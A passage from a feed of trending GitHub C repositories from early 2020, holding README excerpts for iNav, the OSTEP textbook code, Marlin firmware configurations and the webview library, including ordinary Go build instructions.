&lt;p&gt;See: &lt;a href="https://github.com/iNavFlight/inav/blob/master/docs/Installation.md"&gt;https://github.com/iNavFlight/inav/blob/master/docs/Installation.md&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-documentation-support-and-learning-resources" class="anchor" aria-hidden="true" href="#documentation-support-and-learning-resources"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Documentation, support and learning resources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="docs/INAV_Fixed_Wing_Setup_Guide.pdf"&gt;Fixed Wing Guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/INAV_Autolaunch.pdf"&gt;Autolaunch Guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/INAV_Modes.pdf"&gt;Modes Guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/INAV_Wing_Tuning_Masterclass.pdf"&gt;Wing Tuning Masterclass&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/iNavFlight/inav/tree/master/docs"&gt;Official documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/iNavFlight/inav/wiki"&gt;Official Wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://t.me/INAVFlight" rel="nofollow"&gt;INAV Official on Telegram&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/groups/INAVOfficial" rel="nofollow"&gt;INAV Official on Facebook&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.rcgroups.com/forums/showthread.php?2495732-Cleanflight-iNav-(navigation-rewrite)-project" rel="nofollow"&gt;RC Groups Support&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLYsWjANuAm4qdXEGFSeUhOZ10-H8YTSnH" rel="nofollow"&gt;Video series by Painless360&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLOUQ8o2_nCLloACrA6f1_daCjhqY2x0fB" rel="nofollow"&gt;Video series by Paweł Spychalski&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;p&gt;Contributions are welcome and encouraged.  You can contribute in many ways:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Documentation updates and corrections.&lt;/li&gt;
&lt;li&gt;How-To guides - received help?  help others!&lt;/li&gt;
&lt;li&gt;Bug fixes.&lt;/li&gt;
&lt;li&gt;New features.&lt;/li&gt;
&lt;li&gt;Telling us your ideas and suggestions.&lt;/li&gt;
&lt;li&gt;Buying your hardware from this &lt;a href="https://inavflight.com/shop/u/bg/" rel="nofollow"&gt;link&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A good place to start is Telegram channel or Facebook group. Drop in, say hi.&lt;/p&gt;
&lt;p&gt;Github issue tracker is a good place to search for existing issues or report a new bug/feature request:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/iNavFlight/inav/issues"&gt;https://github.com/iNavFlight/inav/issues&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/iNavFlight/inav-configurator/issues"&gt;https://github.com/iNavFlight/inav-configurator/issues&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Before creating new issues please check to see if there is an existing one, search first otherwise you waste peoples time when they could be coding instead!&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-developers" class="anchor" aria-hidden="true" href="#developers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Developers&lt;/h2&gt;
&lt;p&gt;Please refer to the development section in the &lt;a href="https://github.com/iNavFlight/inav/tree/master/docs/development"&gt;docs/development&lt;/a&gt; folder.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-inav-releases" class="anchor" aria-hidden="true" href="#inav-releases"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;INAV Releases&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/iNavFlight/inav/releases"&gt;https://github.com/iNavFlight/inav/releases&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>iNavFlight</author><guid isPermaLink="false">https://github.com/iNavFlight/inav</guid><pubDate>Tue, 04 Feb 2020 00:22:00 GMT</pubDate></item><item><title>remzi-arpacidusseau/ostep-code #23 in C, This week</title><link>https://github.com/remzi-arpacidusseau/ostep-code</link><description>&lt;p&gt;&lt;i&gt;Code from various chapters in OSTEP (http://www.ostep.org)&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-ostep-code" class="anchor" aria-hidden="true" href="#ostep-code"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ostep-code&lt;/h1&gt;
&lt;p&gt;Code from various chapters in OSTEP (&lt;a href="http://www.ostep.org" rel="nofollow"&gt;http://www.ostep.org&lt;/a&gt;)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="intro"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-virtualization" class="anchor" aria-hidden="true" href="#virtualization"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Virtualization&lt;/h2&gt;
&lt;p&gt;CPU Virtualization Chapters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Processes&lt;/li&gt;
&lt;li&gt;&lt;a href="cpu-api"&gt;Process API&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Direct Execution&lt;/li&gt;
&lt;li&gt;CPU Scheduling&lt;/li&gt;
&lt;li&gt;Multi-level Feedback&lt;/li&gt;
&lt;li&gt;&lt;a href="cpu-sched-lottery"&gt;Lottery Scheduling&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Multi-CPU Scheduling&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Memory Virtualization Chapters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="vm-intro"&gt;Address Spaces&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Memory API&lt;/li&gt;
&lt;li&gt;Address Translation&lt;/li&gt;
&lt;li&gt;Segmentation&lt;/li&gt;
&lt;li&gt;Free Space Management&lt;/li&gt;
&lt;li&gt;Introduction to Paging&lt;/li&gt;
&lt;li&gt;Translation Lookaside Buffers&lt;/li&gt;
&lt;li&gt;Advanced Page Tables&lt;/li&gt;
&lt;li&gt;Swapping: Mechanisms&lt;/li&gt;
&lt;li&gt;Swapping: Policies&lt;/li&gt;
&lt;li&gt;Complete VM Systems&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-concurrency" class="anchor" aria-hidden="true" href="#concurrency"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Concurrency&lt;/h2&gt;
&lt;p&gt;Concurrency Chapters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="threads-intro"&gt;Concurrency and Threads&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="threads-api"&gt;Threads API&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="threads-locks"&gt;Locks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Locked Data Structures&lt;/li&gt;
&lt;li&gt;&lt;a href="threads-cv"&gt;Condition Variables&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="threads-sema"&gt;Semaphores&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="threads-bugs"&gt;Concurrency Bugs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Event-based Concurrency&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-persistence" class="anchor" aria-hidden="true" href="#persistence"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Persistence&lt;/h2&gt;
&lt;p&gt;Persistence Chapters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I/O Devices&lt;/li&gt;
&lt;li&gt;Hard Disk Drives&lt;/li&gt;
&lt;li&gt;Redundant Disk Arrays (RAID)&lt;/li&gt;
&lt;li&gt;Files and Directories&lt;/li&gt;
&lt;li&gt;File System Implementation&lt;/li&gt;
&lt;li&gt;Fast File System (FFS)&lt;/li&gt;
&lt;li&gt;FSCK and Journaling&lt;/li&gt;
&lt;li&gt;Log-structured File System (LFS)&lt;/li&gt;
&lt;li&gt;Flash-based SSDs&lt;/li&gt;
&lt;li&gt;Data Integrity and Protection&lt;/li&gt;
&lt;li&gt;&lt;a href="dist-intro"&gt;Distributed Systems&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Network File System (NFS)&lt;/li&gt;
&lt;li&gt;Andrew File System (AFS)&lt;/li&gt;
&lt;/ul&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>remzi-arpacidusseau</author><guid isPermaLink="false">https://github.com/remzi-arpacidusseau/ostep-code</guid><pubDate>Tue, 04 Feb 2020 00:23:00 GMT</pubDate></item><item><title>MarlinFirmware/Configurations #24 in C, This week</title><link>https://github.com/MarlinFirmware/Configurations</link><description>&lt;p&gt;&lt;i&gt;Configurations for Marlin Firmware&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-configurations" class="anchor" aria-hidden="true" href="#configurations"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configurations&lt;/h1&gt;
&lt;p&gt;Pre-tested Configurations for Marlin Firmware&lt;/p&gt;
&lt;p&gt;Marlin Firmware is configured using two files:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Configuration.h&lt;/code&gt; contains core configuration options like machine geometry.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Configuration_adv.h&lt;/code&gt; contains optional settings for advanced and low level features.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For Graphical LCD these files may also be included:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_Bootscreen.h&lt;/code&gt; provides the bitmap for a custom Boot Screen.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_Statusscreen.h&lt;/code&gt; provides bitmaps to customize the Status Screen.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;See the &lt;a href="https://marlinfw.org/docs/configuration/configuration.html" rel="nofollow"&gt;Configuration page&lt;/a&gt; for more information about configuration and individual configuration options.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>MarlinFirmware</author><guid isPermaLink="false">https://github.com/MarlinFirmware/Configurations</guid><pubDate>Tue, 04 Feb 2020 00:24:00 GMT</pubDate></item><item><title>zserge/webview #25 in C, This week</title><link>https://github.com/zserge/webview</link><description>&lt;p&gt;&lt;i&gt;Tiny cross-platform webview library for C/C++/Golang. Uses WebKit (Gtk/Cocoa) and Edge (Windows)&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-webview" class="anchor" aria-hidden="true" href="#webview"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;webview&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://gitter.im/zserge/webview?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/2ff57ff00420ddf8c4e072e70b3f4f8169ebe2a4/68747470733a2f2f6261646765732e6769747465722e696d2f7a73657267652f776562766965772e737667" alt="Join the chat at https://gitter.im/zserge/webview" data-canonical-src="https://badges.gitter.im/zserge/webview.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://travis-ci.org/zserge/webview" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/29f2b675257f0826f16e1b9a8f2e145c0ffb1ae2/68747470733a2f2f7472617669732d63692e6f72672f7a73657267652f776562766965772e7376673f6272616e63683d6d6173746572" alt="Build Status" data-canonical-src="https://travis-ci.org/zserge/webview.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://ci.appveyor.com/project/zserge/webview" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/8e2e944c314c4c1c2f3da8d1a212f1c2e619ddfa/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f6b7369693333717831386439346836763f7376673d74727565" alt="Build status" data-canonical-src="https://ci.appveyor.com/api/projects/status/ksii33qx18d94h6v?svg=true" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://godoc.org/github.com/zserge/webview" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/1be84be0142dac89811420cf32ed3c9a97edbba8/68747470733a2f2f676f646f632e6f72672f6769746875622e636f6d2f7a73657267652f776562766965773f7374617475732e737667" alt="GoDoc" data-canonical-src="https://godoc.org/github.com/zserge/webview?status.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://goreportcard.com/report/github.com/zserge/webview" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/cacceac42f887ca01e93cf6d982756a2feecdd25/68747470733a2f2f676f7265706f7274636172642e636f6d2f62616467652f6769746875622e636f6d2f7a73657267652f77656276696577" alt="Go Report Card" data-canonical-src="https://goreportcard.com/badge/github.com/zserge/webview" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A tiny cross-platform webview library for C/C++/Golang to build modern cross-platform GUIs. Also, there are &lt;a href="https://github.com/Boscop/webview-rs"&gt;Rust bindings&lt;/a&gt;, &lt;a href="https://github.com/zserge/webview-python"&gt;Python bindings&lt;/a&gt;, &lt;a href="https://github.com/oskca/webview"&gt;Nim bindings&lt;/a&gt;, &lt;a href="https://github.com/lettier/webviewhs"&gt;Haskell&lt;/a&gt;, &lt;a href="https://github.com/iwillspeak/webview-cs"&gt;C# bindings&lt;/a&gt; and &lt;a href="https://github.com/shannah/webviewjar"&gt;Java bindings&lt;/a&gt; available.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANT NOTE: Webview is now being rewritten from scratch, with the support of EdgeHTML and using C++14 as a primary language (code becomes much shorter/cleaner, and we still have C and Go APIs as the primary interface). Please have a look at &lt;a href="https://github.com/zserge/webview/tree/webview-x"&gt;webview-x&lt;/a&gt; branch before opening new issues. Current version of webview is still maintained, PRs with bugfixes are welcome, but new functionality will be added to the new branch. I expect to finish the new branch before March 2020, but no hard deadlines.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;It supports two-way JavaScript bindings (to call JavaScript from C/C++/Go and to call C/C++/Go from JavaScript).&lt;/p&gt;
&lt;p&gt;It uses Cocoa/WebKit on macOS, gtk-webkit2 on Linux and MSHTML (IE10/11) on Windows.&lt;/p&gt;
&lt;p align="center"&gt;&lt;a target="_blank" rel="noopener noreferrer" href="examples/todo-go/screenshots/screenshots.png"&gt;&lt;img alt="linux" src="examples/todo-go/screenshots/screenshots.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-webview-for-go-developers" class="anchor" aria-hidden="true" href="#webview-for-go-developers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Webview for Go developers&lt;/h2&gt;
&lt;p&gt;If you are interested in writing Webview apps in C/C++, &lt;a href="#webview-for-cc-developers"&gt;skip to the next section&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-getting-started" class="anchor" aria-hidden="true" href="#getting-started"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Getting started&lt;/h3&gt;
&lt;p&gt;Install Webview library with &lt;code&gt;go get&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ go get github.com/zserge/webview
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Import the package and start using it:&lt;/p&gt;
&lt;div class="highlight highlight-source-go"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;package&lt;/span&gt; main

&lt;span class="pl-k"&gt;import&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;github.com/zserge/webview&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;

&lt;span class="pl-k"&gt;func&lt;/span&gt; &lt;span class="pl-en"&gt;main&lt;/span&gt;() {
	&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;//&lt;/span&gt; Open wikipedia in a 800x600 resizable window&lt;/span&gt;
	webview.&lt;span class="pl-c1"&gt;Open&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Minimal webview example&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
		&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;https://en.m.wikipedia.org/wiki/Main_Page&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-c1"&gt;800&lt;/span&gt;, &lt;span class="pl-c1"&gt;600&lt;/span&gt;, &lt;span class="pl-c1"&gt;true&lt;/span&gt;)
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It is not recommended to use &lt;code&gt;go run&lt;/code&gt; (although it works perfectly fine on Linux). Use &lt;code&gt;go build&lt;/code&gt; instead:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Linux&lt;/span&gt;
$ go build -o webview-example &lt;span class="pl-k"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./webview-example

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; MacOS uses app bundles for GUI apps&lt;/span&gt;
$ mkdir -p example.app/Contents/MacOS
$ go build -o example.app/Contents/MacOS/example
$ open example.app &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Or click on the app in Finder&lt;/span&gt;

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Windows requires special linker flags for GUI apps.&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; It's also recommended to use TDM-GCC-64 compiler for CGo.&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; http://tdm-gcc.tdragon.net/download&lt;/span&gt;
$ go build -ldflags=&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;-H windowsgui&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; -o webview-example.exe&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;a id="user-content-api" class="anchor" aria-hidden="true" href="#api"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;API&lt;/h3&gt;
&lt;p&gt;See &lt;a href="https://godoc.org/github.com/zserge/webview" rel="nofollow"&gt;godoc&lt;/a&gt;.&lt;/p&gt;
